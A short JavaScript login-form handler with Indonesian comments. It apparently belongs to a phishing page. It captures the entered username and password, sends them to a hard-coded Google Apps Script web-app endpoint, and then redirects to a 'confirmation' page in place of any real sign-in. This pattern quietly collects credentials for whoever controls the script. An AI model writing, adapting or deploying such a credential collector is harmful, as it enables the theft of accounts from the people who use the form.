document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();
  
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
  
    fetch("https://script.google.com/macros/s/AKfycbw13WXDuWaYaKRWwE_6_c6Rfm5vf6hpUVMIQ32bGiJF8uwfVye78q2Xhw7hsMtUvD99/exec", {
      method: "POST",
      body: new URLSearchParams({
        username: username,
        password: password
      })
    })
    .then(response => response.text())
    .then(result => {
      // Setelah data berhasil dikirim, alihkan ke halaman konfirmasi
      window.location.href = "confirmation.html";
    })
    .catch(error => {
      alert("Terjadi kesalahan. Coba lagi.");
      console.error("Error:", error);
    });
  });
  